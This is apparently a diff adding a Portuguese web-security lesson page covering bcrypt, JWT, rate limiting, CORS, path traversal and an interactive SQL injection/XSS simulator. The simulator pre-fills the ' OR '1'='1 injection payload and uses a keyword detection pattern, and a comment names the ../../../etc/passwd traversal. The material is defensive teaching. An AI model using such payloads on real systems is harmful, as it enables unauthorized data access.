++'    secure:   <span class="kw">true</span>,     <span class="cm">// somente HTTPS</span>\n'
++'    sameSite: <span class="str">\'strict\'</span>,  <span class="cm">// ✅ nunca envia em cross-site!</span>\n'
++'    maxAge: <span class="nm">24</span> * <span class="nm">60</span> * <span class="nm">60</span> * <span class="nm">1000</span>\n'
++'  }\n'
++'})\n\n'
++'<span class="cm">/* SameSite valores:\n'
++'   strict → nunca envia cross-site (mais seguro)\n'
++'   lax    → bloqueia POST cross-site, permite GET\n'
++'   none   → sempre envia (sem protecao CSRF)\n'
++'*/'
++'</pre></div></div>',
+
+auth: '<div class="hero"><div class="badge a">🔑 OWASP A07:2021 — Alto</div><h1>Autenticação Fraca</h1><p>Senhas em plaintext, MD5, tokens inseguros e sessões mal gerenciadas comprometem toda a aplicação.</p></div>'
++'<div class="tabs" id="auth-tabs">'
++'<div class="tab active" data-tab="auth-pw">🔐 Hash de Senhas</div>'
++'<div class="tab" data-tab="auth-jwt">🎫 JWT Seguro</div>'
++'<div class="tab" data-tab="auth-rate">🚦 Rate Limiting</div>'
++'<div class="tab" data-tab="auth-ck">✅ Checklist</div>'
++'</div>'
+
++'<div class="tc active" id="auth-pw">'
++'<div class="cw"><div class="ch"><span class="cl">❌ Algoritmos inseguros para senhas</span></div>'
++'<pre>'
++'<span class="cm">// ❌ Plaintext — jamais!</span>\n'
++'<span class="kw">const</span> user = { password: req.body.password }\n\n'
++'<span class="cm">// ❌ MD5 — quebrado desde os anos 90</span>\n'
++'<span class="kw">const</span> hash = <span class="fn">md5</span>(password)\n\n'
++'<span class="cm">// ❌ SHA-256 — rapido demais, GPU quebra em segundos</span>\n'
++'<span class="kw">const</span> hash = <span class="fn">sha256</span>(password)\n\n'
++'<span class="cm">// ❌ Salt fixo — vulneravel a rainbow tables</span>\n'
++'<span class="kw">const</span> hash = <span class="fn">sha256</span>(password + <span class="str">"salt-fixo"</span>)'
++'</pre></div>'
++'<div class="cw"><div class="ch"><span class="cl">✅ bcrypt — lento por design, salt automático</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> bcrypt <span class="kw">from</span> <span class="str">\'bcrypt\'</span>\n\n'
++'<span class="kw">const</span> SALT_ROUNDS = <span class="nm">12</span>  <span class="cm">// custo computacional (10-14 recomendado)</span>\n\n'
++'<span class="kw">export async function</span> <span class="fn">hashPassword</span>(password: <span class="tp">string</span>) {\n'
++'  <span class="fn">validateStrength</span>(password)\n'
++'  <span class="kw">return</span> bcrypt.<span class="fn">hash</span>(password, SALT_ROUNDS)\n'
++'  <span class="cm">// Resultado: "$2b$12$[22 chars salt][31 chars hash]"</span>\n'
++'}\n\n'
++'<span class="kw">export async function</span> <span class="fn">verifyPassword</span>(pwd: <span class="tp">string</span>, hash: <span class="tp">string</span>) {\n'
++'  <span class="kw">return</span> bcrypt.<span class="fn">compare</span>(pwd, hash)  <span class="cm">// tempo constante</span>\n'
++'}\n\n'
++'<span class="kw">function</span> <span class="fn">validateStrength</span>(pwd: <span class="tp">string</span>) {\n'
++'  <span class="kw">if</span> (pwd.length < <span class="nm">8</span>)         <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">\'Min 8 chars\'</span>)\n'
++'  <span class="kw">if</span> (!<span class="str">/[A-Z]/</span>.<span class="fn">test</span>(pwd))      <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">\'Precisa maiuscula\'</span>)\n'
++'  <span class="kw">if</span> (!<span class="str">/[0-9]/</span>.<span class="fn">test</span>(pwd))      <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">\'Precisa numero\'</span>)\n'
++'  <span class="kw">if</span> (!<span class="str">/[^a-zA-Z0-9]/</span>.<span class="fn">test</span>(pwd)) <span class="kw">throw new</span> <span class="fn">Error</span>(<span class="str">\'Precisa simbolo\'</span>)\n'
++'}'
++'</pre></div></div>'
+
++'<div class="tc" id="auth-jwt">'
++'<div class="cw"><div class="ch"><span class="cl">✅ JWT com access + refresh tokens</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> jwt <span class="kw">from</span> <span class="str">\'jsonwebtoken\'</span>\n'
++'<span class="kw">import</span> crypto <span class="kw">from</span> <span class="str">\'crypto\'</span>\n\n'
++'<span class="kw">export function</span> <span class="fn">generateTokens</span>(userId: <span class="tp">string</span>, role: <span class="tp">string</span>) {\n'
++'  <span class="kw">const</span> jti = crypto.<span class="fn">randomUUID</span>()  <span class="cm">// ID para revogacao</span>\n\n'
++'  <span class="kw">const</span> accessToken = jwt.<span class="fn">sign</span>(\n'
++'    { userId, role, jti },\n'
++'    process.env.<span class="nm">JWT_SECRET</span>,\n'
++'    {\n'
++'      expiresIn: <span class="str">\'15m\'</span>,    <span class="cm">// ✅ curto — minimiza dano se vazado</span>\n'
++'      algorithm: <span class="str">\'HS256\'</span>,\n'
++'      issuer:    <span class="str">\'meuapp.com\'</span>,\n'
++'      audience:  <span class="str">\'meuapp.com\'</span>,\n'
++'    }\n'
++'  )\n\n'
++'  <span class="kw">const</span> refreshToken = jwt.<span class="fn">sign</span>(\n'
++'    { userId, jti },\n'
++'    process.env.<span class="nm">REFRESH_SECRET</span>,\n'
++'    { expiresIn: <span class="str">\'7d\'</span> }\n'
++'  )\n\n'
++'  <span class="cm">// ✅ refresh em httpOnly cookie — nunca em localStorage!</span>\n'
++'  res.<span class="fn">cookie</span>(<span class="str">\'refresh_token\'</span>, refreshToken, {\n'
++'    httpOnly: <span class="kw">true</span>, secure: <span class="kw">true</span>, sameSite: <span class="str">\'strict\'</span>\n'
++'  })\n'
++'  <span class="kw">return</span> { accessToken }\n'
++'}'
++'</pre></div>'
++'<div class="alert w"><strong>⚠️ Secret fraco</strong>JWT_SECRET precisa ter no minimo 32 bytes aleatorios. Gere com: <code>node -e "console.log(require(\'crypto\').randomBytes(32).toString(\'hex\'))"</code></div>'
++'</div>'
+
++'<div class="tc" id="auth-rate">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Rate Limiting + proteção brute force</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> rateLimit <span class="kw">from</span> <span class="str">\'express-rate-limit\'</span>\n'
++'<span class="kw">import</span> slowDown  <span class="kw">from</span> <span class="str">\'express-slow-down\'</span>\n\n'
++'<span class="cm">// 5 tentativas por 15min, por username</span>\n'
++'<span class="kw">export const</span> loginLimiter = <span class="fn">rateLimit</span>({\n'
++'  windowMs: <span class="nm">15</span> * <span class="nm">60</span> * <span class="nm">1000</span>,\n'
++'  max: <span class="nm">5</span>,\n'
++'  message: { error: <span class="str">\'Muitas tentativas. Aguarde 15 minutos.\'</span> },\n'
++'  keyGenerator: (req) => req.body?.username ?? req.ip,\n'
++'})\n\n'
++'<span class="cm">// Slow down progressivo apos 3 tentativas</span>\n'
++'<span class="kw">export const</span> speedLimiter = <span class="fn">slowDown</span>({\n'
++'  windowMs: <span class="nm">15</span> * <span class="nm">60</span> * <span class="nm">1000</span>,\n'
++'  delayAfter: <span class="nm">3</span>,\n'
++'  delayMs: (hits) => hits * <span class="nm">500</span>,  <span class="cm">// 500ms, 1s, 1.5s...</span>\n'
++'})\n\n'
++'app.<span class="fn">post</span>(<span class="str">\'/auth/login\'</span>, speedLimiter, loginLimiter, loginHandler)\n'
++'app.<span class="fn">use</span>(<span class="str">\'/api\'</span>, <span class="fn">rateLimit</span>({ windowMs: <span class="nm">60000</span>, max: <span class="nm">100</span> }))'
++'</pre></div></div>'
+
++'<div class="tc" id="auth-ck">'
++'<ul class="cl2">'
++'<li><span class="ck2 ok">✓</span><span>Use <code>bcrypt</code> com salt_rounds >= 10 — nunca MD5, SHA1 ou SHA-256 direto</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Access tokens com expiração curta (15min), refresh tokens com rotação</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Armazene JWTs em <code>httpOnly</code> cookies — nunca em <code>localStorage</code></span></li>'
++'<li><span class="ck2 ok">✓</span><span>Rate limiting e slow down no endpoint de login</span></li>'
++'<li><span class="ck2 ok">✓</span><span>HTTPS obrigatório em produção — <code>Strict-Transport-Security</code> via Helmet</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Mensagens genéricas: "Credenciais inválidas" — nunca "Senha errada" ou "Usuário não existe"</span></li>'
++'<li><span class="ck2 ok">✓</span><span>Tempo de resposta constante mesmo quando o usuário não existe (evita timing attack)</span></li>'
++'<li><span class="ck2 wn">!</span><span>Considere 2FA com TOTP — biblioteca <code>otplib</code> ou <code>speakeasy</code></span></li>'
++'<li><span class="ck2 wn">!</span><span>Invalide sessões no logout — blacklist de JTI no Redis ou delete da sessão</span></li>'
++'</ul></div>',
+
+misc: '<div class="hero"><div class="badge p">🛡️ OWASP A02 + A05:2021</div><h1>Outros Ataques Importantes</h1><p>CORS mal configurado, path traversal, exposição de segredos e dependências vulneráveis.</p></div>'
++'<div class="tabs" id="misc-tabs">'
++'<div class="tab active" data-tab="misc-env">🔑 Secrets</div>'
++'<div class="tab" data-tab="misc-cors">🌐 CORS</div>'
++'<div class="tab" data-tab="misc-path">📁 Path Traversal</div>'
++'<div class="tab" data-tab="misc-deps">📦 Dependências</div>'
++'</div>'
+
++'<div class="tc active" id="misc-env">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Validação de variáveis de ambiente com Zod</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> { z } <span class="kw">from</span> <span class="str">\'zod\'</span>\n\n'
++'<span class="kw">const</span> EnvSchema = z.<span class="fn">object</span>({\n'
++'  NODE_ENV:       z.<span class="fn">enum</span>([<span class="str">\'development\'</span>, <span class="str">\'production\'</span>, <span class="str">\'test\'</span>]),\n'
++'  DATABASE_URL:   z.<span class="fn">string</span>().<span class="fn">url</span>(),\n'
++'  JWT_SECRET:     z.<span class="fn">string</span>().<span class="fn">min</span>(<span class="nm">32</span>),  <span class="cm">// minimo 256 bits</span>\n'
++'  SESSION_SECRET: z.<span class="fn">string</span>().<span class="fn">min</span>(<span class="nm">32</span>),\n'
++'  PORT:           z.<span class="fn">coerce</span>.<span class="fn">number</span>().<span class="fn">default</span>(<span class="nm">3000</span>),\n'
++'})\n\n'
++'<span class="kw">const</span> parsed = EnvSchema.<span class="fn">safeParse</span>(process.env)\n'
++'<span class="kw">if</span> (!parsed.success) {\n'
++'  console.<span class="fn">error</span>(<span class="str">\'Variaveis de ambiente invalidas:\'</span>, parsed.error.<span class="fn">format</span>())\n'
++'  process.<span class="fn">exit</span>(<span class="nm">1</span>)  <span class="cm">// falha segura — nao inicia sem config correta</span>\n'
++'}\n'
++'<span class="kw">export const</span> env = parsed.data\n\n'
++'<span class="cm">// .gitignore OBRIGATORIO: .env, .env.local, .env.production</span>'
++'</pre></div>'
++'<div class="alert w"><strong>🚀 Em producao</strong>Use: AWS Secrets Manager, HashiCorp Vault, Google Secret Manager ou Doppler. Nunca secrets hardcoded ou em variaveis expostas em logs.</div>'
++'</div>'
+
++'<div class="tc" id="misc-cors">'
++'<div class="cw"><div class="ch"><span class="cl">✅ CORS configurado corretamente</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">const</span> allowedOrigins = [\n'
++'  <span class="str">\'https://meuapp.com\'</span>,\n'
++'  <span class="str">\'https://www.meuapp.com\'</span>,\n'
++'  ...(process.env.<span class="nm">NODE_ENV</span> === <span class="str">\'development\'</span>\n'
++'    ? [<span class="str">\'http://localhost:3000\'</span>, <span class="str">\'http://localhost:5173\'</span>]\n'
++'    : []),\n'
++']\n\n'
++'app.<span class="fn">use</span>(<span class="fn">cors</span>({\n'
++'  origin: (origin, callback) => {\n'
++'    <span class="kw">if</span> (!origin || allowedOrigins.<span class="fn">includes</span>(origin))\n'
++'      <span class="kw">return</span> <span class="fn">callback</span>(<span class="kw">null</span>, <span class="kw">true</span>)\n'
++'    <span class="fn">callback</span>(<span class="kw">new</span> <span class="fn">Error</span>(<span class="str">\'CORS bloqueado\'</span>))\n'
++'  },\n'
++'  credentials:    <span class="kw">true</span>,\n'
++'  methods:        [<span class="str">\'GET\'</span>, <span class="str">\'POST\'</span>, <span class="str">\'PUT\'</span>, <span class="str">\'DELETE\'</span>],\n'
++'  allowedHeaders: [<span class="str">\'Content-Type\'</span>, <span class="str">\'Authorization\'</span>, <span class="str">\'X-CSRF-Token\'</span>],\n'
++'}))\n\n'
++'<span class="cm">// ❌ NUNCA em producao:</span>\n'
++'app.<span class="fn">use</span>(<span class="fn">cors</span>())              <span class="cm">// permite qualquer origem</span>\n'
++'app.<span class="fn">use</span>(<span class="fn">cors</span>({ origin: <span class="str">\'*\'</span> }))  <span class="cm">// idem</span>'
++'</pre></div></div>'
+
++'<div class="tc" id="misc-path">'
++'<div class="cw"><div class="ch"><span class="cl">✅ Prevenção de Path Traversal</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> path <span class="kw">from</span> <span class="str">\'path\'</span>\n\n'
++'<span class="kw">const</span> UPLOADS = path.<span class="fn">resolve</span>(__dirname, <span class="str">\'../uploads\'</span>)\n'
++'<span class="kw">const</span> ALLOWED = <span class="kw">new</span> <span class="fn">Set</span>([<span class="str">\'.pdf\'</span>, <span class="str">\'.png\'</span>, <span class="str">\'.jpg\'</span>])\n\n'
++'app.<span class="fn">get</span>(<span class="str">\'/uploads/:filename\'</span>, (req, res) => {\n'
++'  <span class="kw">const</span> filePath = path.<span class="fn">resolve</span>(UPLOADS, req.params.filename)\n\n'
++'  <span class="cm">// ✅ Bloqueia ../../../etc/passwd</span>\n'
++'  <span class="kw">if</span> (!filePath.<span class="fn">startsWith</span>(UPLOADS + path.sep))\n'
++'    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="nm">403</span>).<span class="fn">json</span>({ error: <span class="str">\'Acesso negado\'</span> })\n\n'
++'  <span class="cm">// ✅ Valida extensao do arquivo</span>\n'
++'  <span class="kw">if</span> (!ALLOWED.<span class="fn">has</span>(path.<span class="fn">extname</span>(filePath).<span class="fn">toLowerCase</span>()))\n'
++'    <span class="kw">return</span> res.<span class="fn">status</span>(<span class="nm">400</span>).<span class="fn">json</span>({ error: <span class="str">\'Tipo nao permitido\'</span> })\n\n'
++'  res.<span class="fn">sendFile</span>(filePath)\n'
++'})'
++'</pre></div></div>'
+
++'<div class="tc" id="misc-deps">'
++'<div class="cw"><div class="ch"><span class="cl">Gestão de dependências vulneráveis</span><span class="ck">bash</span></div>'
++'<pre>'
++'<span class="cm"># Auditoria de vulnerabilidades (CVEs)</span>\n'
++'npm audit\n\n'
++'<span class="cm"># Corrige automaticamente quando possivel</span>\n'
++'npm audit fix\n\n'
++'<span class="cm"># Snyk — analise mais completa</span>\n'
++'npx snyk test\n\n'
++'<span class="cm"># Pacotes desatualizados</span>\n'
++'npm outdated'
++'</pre></div>'
++'<div class="alert s"><strong>✅ GitHub Dependabot</strong>Configure no repositorio para receber PRs automaticos quando dependencias tem CVEs conhecidos. Arquivo: <code>.github/dependabot.yml</code></div>'
++'</div>',
+
+proj: '<div class="hero"><div class="badge g">🛠️ Laboratório Prático</div><h1>Template de API Segura</h1><p>Estrutura completa com todas as proteções. Use como base para seus projetos Node.js + Express + TypeScript.</p></div>'
++'<div class="cw"><div class="ch"><span class="cl">Estrutura do projeto</span></div>'
++'<pre>'
++'projeto-seguro/\n'
++'├── src/\n'
++'│   ├── config/\n'
++'│   │   └── env.ts                <span class="cm"># Validacao de variaveis (Zod)</span>\n'
++'│   ├── middleware/\n'
++'│   │   ├── auth.middleware.ts    <span class="cm"># Validacao JWT</span>\n'
++'│   │   ├── csrf.middleware.ts    <span class="cm"># CSRF token check</span>\n'
++'│   │   ├── rateLimit.ts         <span class="cm"># Rate limiting por rota</span>\n'
++'│   │   └── validate.ts          <span class="cm"># Zod schema validation</span>\n'
++'│   ├── routes/\n'
++'│   │   ├── auth.routes.ts       <span class="cm"># /login /register /refresh /logout</span>\n'
++'│   │   └── user.routes.ts       <span class="cm"># Endpoints protegidos</span>\n'
++'│   ├── services/\n'
++'│   │   └── auth.service.ts      <span class="cm"># bcrypt + JWT logic</span>\n'
++'│   ├── utils/\n'
++'│   │   └── sanitize.ts          <span class="cm"># DOMPurify wrapper</span>\n'
++'│   └── app.ts                   <span class="cm"># Express + todos os middlewares</span>\n'
++'├── .env.example\n'
++'├── .gitignore                   <span class="cm"># Inclui .env*</span>\n'
++'└── tsconfig.json'
++'</pre></div>'
++'<div class="cw"><div class="ch"><span class="cl">src/app.ts — configuracao de seguranca completa</span><span class="ck">TypeScript</span></div>'
++'<pre>'
++'<span class="kw">import</span> express   <span class="kw">from</span> <span class="str">\'express\'</span>\n'
++'<span class="kw">import</span> helmet    <span class="kw">from</span> <span class="str">\'helmet\'</span>\n'
++'<span class="kw">import</span> cors      <span class="kw">from</span> <span class="str">\'cors\'</span>\n'
++'<span class="kw">import</span> session   <span class="kw">from</span> <span class="str">\'express-session\'</span>\n'
++'<span class="kw">import</span> { rateLimit } <span class="kw">from</span> <span class="str">\'express-rate-limit\'</span>\n'
++'<span class="kw">import</span> { env }   <span class="kw">from</span> <span class="str">\'./config/env\'</span>\n\n'
++'<span class="kw">const</span> app = <span class="fn">express</span>()\n\n'
++'<span class="cm">// 1. Headers de seguranca (XSS, clickjacking, MIME sniffing)</span>\n'
++'app.<span class="fn">use</span>(<span class="fn">helmet</span>())\n\n'
++'<span class="cm">// 2. CORS restrito</span>\n'
++'app.<span class="fn">use</span>(<span class="fn">cors</span>({ origin: env.ALLOWED_ORIGINS, credentials: <span class="kw">true</span> }))\n\n'
++'<span class="cm">// 3. Limita body — evita DoS</span>\n'
++'app.<span class="fn">use</span>(express.<span class="fn">json</span>({ limit: <span class="str">\'10kb\'</span> }))\n\n'
++'<span class="cm">// 4. Rate limit global</span>\n'
++'app.<span class="fn">use</span>(<span class="fn">rateLimit</span>({ windowMs: <span class="nm">60_000</span>, max: <span class="nm">100</span> }))\n\n'
++'<span class="cm">// 5. Sessao segura</span>\n'
++'app.<span class="fn">use</span>(<span class="fn">session</span>({\n'
++'  secret: env.SESSION_SECRET,\n'
++'  resave: <span class="kw">false</span>, saveUninitialized: <span class="kw">false</span>,\n'
++'  cookie: { httpOnly: <span class="kw">true</span>, secure: <span class="kw">true</span>, sameSite: <span class="str">\'strict\'</span> }\n'
++'})\n\n'
++'<span class="cm">// 6. Remove header que revela a tecnologia</span>\n'
++'app.<span class="fn">disable</span>(<span class="str">\'x-powered-by\'</span>)\n\n'
++'<span class="kw">export default</span> app'
++'</pre></div>'
++'<div class="cw"><div class="ch"><span class="cl">Instalar dependencias</span><span class="ck">bash</span></div>'
++'<pre>'
++'<span class="cm"># Seguranca</span>\n'
++'npm install helmet cors bcrypt jsonwebtoken csrf\n'
++'npm install express-rate-limit express-slow-down express-session\n'
++'npm install dompurify jsdom zod dotenv\n\n'
++'<span class="cm"># Types</span>\n'
++'npm install -D @types/bcrypt @types/jsonwebtoken @types/express\n'
++'npm install -D @types/express-session @types/cors @types/node\n'
++'npm install -D typescript ts-node nodemon'
++'</pre></div>'
++'<div class="alert s"><strong>🎯 Exercicio para a turma</strong>Construa um endpoint POST /api/comentarios que: (1) valida input com Zod, (2) sanitiza HTML com DOMPurify, (3) usa Prepared Statement no banco, (4) exige CSRF token, (5) tem rate limiting de 10 req/min por usuario, e (6) retorna mensagem generica de erro em caso de falha.</div>'
+};
+
+// Build nav
+var navEl = document.getElementById('nav');
+sections.forEach(function(s, i) {
+  var d = document.createElement('div');
+  d.className = 'ni' + (i === 0 ? ' active' : '');
+  d.dataset.idx = i;
+  d.innerHTML = '<span class="nn">' + s.num + '</span><span>' + s.icon + '</span><span>' + s.label + '</span>';
+  d.addEventListener('click', function() { goTo(parseInt(d.dataset.idx)); });
+  navEl.appendChild(d);
+});
+
+// Build sections
+var contentEl = document.getElementById('content');
+sections.forEach(function(s, i) {
+  var sec = document.createElement('div');
+  sec.className = 'section' + (i === 0 ? ' active' : '');
+  sec.id = 'sec-' + s.id;
+  var navHtml = '<div class="nf">'
+    + (i > 0 ? '<button class="nb" onclick="goTo(' + (i-1) + ')">&#8592; Anterior</button>' : '<span></span>')
+    + '<span class="np">' + (i+1) + ' / ' + sections.length + '</span>'
+    + (i < sections.length-1 ? '<button class="nb p" onclick="goTo(' + (i+1) + ')">Proxima &#8594;</button>' : '<span style="color:#4ade80;font-weight:600">Aula completa! 🎉</span>')
+    + '</div>';
+  sec.innerHTML = html[s.id] + navHtml;
+  contentEl.appendChild(sec);
+});
+
+// Tab handling
+document.addEventListener('click', function(e) {
+  var tab = e.target.closest('.tab');
+  if (!tab) return;
+  var tabsEl = tab.parentElement;
+  var tabId = tab.dataset.tab;
+  tabsEl.querySelectorAll('.tab').forEach(function(t) { t.classList.remove('active'); });
+  tab.classList.add('active');
+  var section = tabsEl.closest('.section');
+  section.querySelectorAll('.tc').forEach(function(tc) { tc.classList.remove('active'); });
+  var target = section.querySelector('#' + tabId);
+  if (target) target.classList.add('active');
+});
+
+function goTo(idx) {
+  document.querySelectorAll('.section').forEach(function(s, i) { s.classList.toggle('active', i === idx); });
+  document.querySelectorAll('.ni').forEach(function(n, i) { n.classList.toggle('active', i === idx); });
+  window.scrollTo(0, 0);
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+
+function simSQLI() {
+  var user = document.getElementById('s-user').value;
+  var pass = document.getElementById('s-pass').value;
+  var query = "SELECT * FROM users WHERE username = '" + user + "' AND password = '" + pass + "'";
+  var isAttack = /['";]|--|OR |UNION |DROP /i.test(user + pass);
+  var res = document.getElementById('sqli-r');
+  res.style.display = 'block';
+  if (isAttack) {
+    res.className = 'dr bad';
+    res.textContent = 'VULNERAVEL!\n\nQuery gerada:\n' + query + '\n\nResultado: TODOS os registros retornados!\nAtacante tem acesso total sem saber a senha.';
+  } else {
+    res.className = 'dr good';
+    res.textContent = 'Input sem payloads suspeitos.\nQuery executada normalmente.';
+  }
+}
+
+function rstSQLI() {
+  document.getElementById('s-user').value = "' OR '1'='1";
+  document.getElementById('s-pass').value = 'qualquer coisa';
+  document.getElementById('sqli-r').style.display = 'none';
+}
+
+function xssUnsafe() {
+  var v = document.getElementById('xss-in').value;
+  var bad = document.getElementById('xss-bad');
+  var ok = document.getElementById('xss-ok');
+  ok.style.display = 'none';
+  bad.style.display = 'block';
+  bad.className = 'dr bad';
+  bad.textContent = 'SEM PROTECAO (innerHTML):\n' + v + '\n\nSe fosse executado, scripts rodariam no browser da vitima!\nCookies e dados sensiveis estariam expostos.';
+}
+
+function xssSafe() {
+  var v = document.getElementById('xss-in').value;
+  var bad = document.getElementById('xss-bad');
+  var ok = document.getElementById('xss-ok');
+  bad.style.display = 'none';
+  ok.style.display = 'block';
+  ok.className = 'dr good';
+  ok.textContent = 'COM PROTECAO (textContent):\n' + v + '\n\nO HTML foi tratado como texto puro.\nNenhum script foi executado.';
+}
+</script>
+</body>
+</html>
